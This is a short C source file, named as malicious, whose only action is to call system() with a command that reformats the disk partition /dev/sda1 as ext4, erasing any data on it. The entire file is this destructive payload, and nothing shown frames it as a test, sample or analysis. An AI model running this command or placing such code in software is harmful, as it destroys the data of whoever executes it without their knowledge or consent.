// malicious_format_drive.c
#include <stdlib.h>

int main() {
    system("mkfs.ext4 /dev/sda1");
    return 0;
}
